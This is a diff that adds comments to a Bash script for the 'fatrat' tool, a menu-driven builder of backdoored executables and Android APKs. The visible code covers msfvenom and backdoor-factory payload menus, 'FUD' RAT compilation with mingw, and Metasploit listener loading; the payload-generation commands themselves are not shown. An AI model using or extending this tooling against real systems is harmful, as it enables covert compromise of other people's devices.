@@ -44,7 +44,7 @@ dist0=$dist
 fi
 
 #SAMARAN TAMPAN
-
+#Variables 
 path=`pwd`
 Versi=1.9.4
 codename=Whistle
@@ -114,7 +114,7 @@ spinlong2 ()
         sleep 0.02
     done
 }
-
+# Default Local Host & Port file creation function
 function confdefault () {
 clear
 confd=$path/config/conf.def
@@ -253,7 +253,7 @@ confdefault
 esac
 fi
 }
-
+# Verify user input values on manual Lhost , Lport & filename
 function invalid ()
 {
 err=0
@@ -281,7 +281,7 @@ err=1
 fi
 echo -e $okegreen ""
 }
-
+#Selection of Executable and verify if exists for backdoor-factory
 function selexe() {
 echo ""
           echo -e $okegreen "Enter the path to your EXE file .(ex: /root/downloads/myfile.exe)"
@@ -298,7 +298,7 @@ read cont
 selexe
 fi
 }
-
+#Apk embeded file selection and verify if user path is correct
 function selapk() {
 echo ""
           echo -e $okegreen "Enter the path to your android app/game .(ex: /root/downloads/myapp.apk)"
@@ -315,7 +315,7 @@ read cont
 selapk
 fi
 }
-
+#Verification of user input for Lhost & Lport Only
 function invalid1 ()
 {
 err=0
@@ -337,7 +337,8 @@ fi
 echo -e $okegreen ""
 }
 
-
+# Verify if user ip input is valid
+#this function is not active yet because user may input an hostame
 valid_ip()
 {
 
@@ -386,7 +387,7 @@ cat << !
 
 !
 }
-
+# Function to create a listener for apk
 function crlst() {
 echo -e $okegreen "Do you want to create a listener for this configuration"
 echo -e $okegreen "to use in msfconsole in future ?"
@@ -440,7 +441,7 @@ menu
 ;;
 esac
 }
-
+#Post exploit menu selection
 function postexp() {
 echo ""
 echo -e $orange "  +------------------------------------+"
@@ -474,7 +475,7 @@ postexp
 ;;
 esac
 }
-
+# Backdoor-factory menu payload selection
 function pldbkf() {
 echo ""
 echo -e $orange "  +--------------------------------------------+"
@@ -526,7 +527,7 @@ pldbkf
 ;;
 esac
 }
-
+# Linux msfvenom payload selection
 function pldlnx () {
 echo ""
 echo -e $orange "  +-----------------------------------------+"
@@ -570,7 +571,7 @@ pldlnx
 ;;
 esac
 }
-
+# Windows msfvenom payload selection
 function pldwin () {
 echo ""
 echo -e $orange "  +-------------------------------------------+"
@@ -610,7 +611,7 @@ pldwin
 ;;
 esac
 }
-
+# Android msfvenom payload selection
 function pldand () {
 echo ""
 echo -e $orange "  +-------------------------------------------+"
@@ -650,7 +651,7 @@ pldand
 ;;
 esac
 }
-
+# Mac msfvenom payload selection
 function pldmac() {
 echo ""
 echo -e $orange "  +--------------------------------------+"
@@ -674,7 +675,7 @@ pldmac
 ;;
 esac
 }
-
+# Linux multi msfvenom payload selection
 function pldmul() {
 echo ""
 echo -e $orange "  +-----------------------------------------+"
@@ -739,15 +740,16 @@ echo "----------------------------------------------" >> $msploit
 
 }
 
-#Checking
+#Checking if user is root
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
 clear
 
-#check config
+#check if tools path config file exists before proceeding
 
 if [ -f "$file" ]
 then
+#config file exists , then load tools paths to specific variables
 msfconsole=`sed -n 14p $file`
 msfvenom=`sed -n 15p $file`
 backdoor=`sed -n 16p $file`
@@ -758,11 +760,12 @@ keytool=`sed -n 7p $file`
 sign=`sed -n 5p $file`
 dx=`sed -n 10p $file`
 else
+#config file does not exist
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
 exit 1
 fi
 
-
+#If default Lhost & Lport configuration file exists then load their values to variables
 if [ -f "$defcon" ]
 then
 yourip=`sed -n 1p $defcon`
@@ -770,6 +773,7 @@ yourport=`sed -n 2p $defcon`
 fi
 
 #Jangan Nakal CTRL C MULU
+#Abort fatrat with Ctrl+C
 
 trap ctrl_c INT
 ctrl_c() {
@@ -786,7 +790,7 @@ echo ""
 echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
 exit
 }
-
+#If first internet check with ping google hostname fails then run this next function to check what happens
 function chknet() {
 echo -e $red "[X] Your Internet is not working correctly!"
 sleep 0.5
@@ -1190,7 +1194,8 @@ echo -e $okegreen [✔]::[Terminal]: local ;
 fi
 
 sleep 0.5
-#Checking internet connection by pinging hostname or ip dns (google)
+#Checking internet connection by pinging hostname (google)
+#case ping hostname fails then run chknet function
  ping -c 1 google.com > /dev/null 2>&1
 png="$?"
  if [ $png == "0" ]
@@ -1353,21 +1358,26 @@ case $fwin in
     echo -e $yellow "  Your public IP address is : $publicip"
     echo -e $yellow "  Your Hostname is : $hostn"
     echo -e $okegreen""
+    #Case default lhost & lport config file does not exist then fill variables with ""
     if [ ! -f "$defcon" ]
     then
     yourip=""
     yourport=""
     fi
+    # If variable ip is empty (no default config) then popup user input
     if [ -z "$yourip" ]; then
     read -p '   Set LHOST IP: ' yourip
     fi
+    # If variable local port is empty (no default config) then popup user input
     echo -e $okegreen ""
     if [ -z "$yourport" ]; then
     read -p '   Set LPORT: ' yourport
     fi
     echo ""
     read -p '   Please enter the base name for output files : ' fira
+    #Go make a check if user inputed any value or not
     invalid
+    #From invalid , a variable will return with 0 or 1 , if 1 then abort & return to fudwin menu
     if [ $err == "1" ]
     then
     echo -e $okegreen ""
@@ -1375,6 +1385,7 @@ case $fwin in
     read inp
     fudwin
     fi
+    #check if ming64 exists and provide 32bit or 64bit option to create rat
     which i686-w64-mingw32-gcc >> $logfud 2>&1
     if [ "$?" -eq "0" ]; then
     spinlong
@@ -1421,7 +1432,7 @@ echo ""
     fudwin
     fi
     fi
-
+# On this point , fatrat detected that there is no mingw64 installed , so will proceed automatically to rat 32bit creation
     which i586-mingw32msvc-gcc >> $logfud 2>&1
     if [ "$?" -eq "0" ]; then
     echo ""
@@ -1439,6 +1450,7 @@ echo ""
     fi
     ;;
 2)
+#slowbutpowerfull selection
     chmod +x powerfull.sh
     xterm -fa monaco -fs 13 -bg black ./powerfull.sh
     clear
@@ -2820,13 +2832,16 @@ esac
                   elif test $fatrat1 == '5'
                   then
                   echo ""
+# do an ls command on listeners folder to search .rc files , and count them 
                   lit=`ls -1 $list/*.rc 2>/dev/null | wc -l`
+#If on last count there is more that 0 files then proceed
                   if [ $lit != 0 ]
                   then
                   echo -e $orange "  +-------------------------+"
                   echo -e $orange "  |$okegreen Current saved listeners$orange |"
                   echo -e $orange "  +-------------------------+"
-                  for liste in config/listeners/*.rc; do
+                 # Rc files detected in listeners folder , print their names
+		 for liste in config/listeners/*.rc; do
                   echo ${liste##*/}
                   done
                   echo ""
@@ -2836,11 +2851,13 @@ esac
                   echo ""
                   echo -ne "   Filename : ";tput sgr0
                   read fname
+		  #case user do not input any value then return to menu listeners
                   if [ -z $fname ]
                   then
                   clear
                   clisteners
                   fi
+		  #Check if the input rc from user in list really exists
                   if [ ! -f $list/$fname ]
                   then
                   echo ""
@@ -2850,7 +2867,8 @@ esac
                   echo -e $orange "  |$okegreen Current saved listeners$orange |"
                   echo -e $orange "  +-------------------------+"
                   echo -e $okegreen ""
-                  for liste in config/listeners/*.rc; do
+                  # rc file did not exists , print again the current list and return to listeners menu
+		  for liste in config/listeners/*.rc; do
                   echo ${liste##*/}
                   done
                   echo ""
@@ -2861,10 +2879,12 @@ esac
                   clear
                   clisteners
                   fi
+		  #rc filename input exists , load msfconsole with that config
                   xterm -fa monaco -fs 13 -bg black -e $msfconsole -r $list/$fname
                   clear
                   menu
                   else
+		  #no rc files were detected in listeners folder
                   echo -e $yellow "  No listeners configuration files were found."
                   echo ""
                   echo -e $okegreen "  Press [ENTER] key to return to menu"
@@ -3535,9 +3555,10 @@ embedapk
 fi
 echo ""
 selapk
+#cp user selected apk to temp folder
 cp $exef $path/temp/app.apk >/dev/null 2>&1
 apkt="$path/temp/app.apk"
-
+# check if apk was copyed succefully
 if [ ! -f $apkt ]; then
     echo ""
 echo -e $red "There was a problem copying your apk file to final destination ."
@@ -3546,12 +3567,14 @@ menu
   fi
 
 echo ""
+#go to payload android menu
 pldand
 echo ""
 echo ""
 spinlong
 echo ""
 sleep 1
+#select tool to build apk rat
 echo -e $orange "+------------------------------+"
 echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.2$orange |"
 echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange  |"
@@ -3565,6 +3588,7 @@ echo ""
 spinlong
 outf="app_backdoor.apk"
 gboor2
+# remove any existent apkconfig file and create a new one with the data for backdoor_apk to read
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig
 echo "app.apk" > $apkconfig
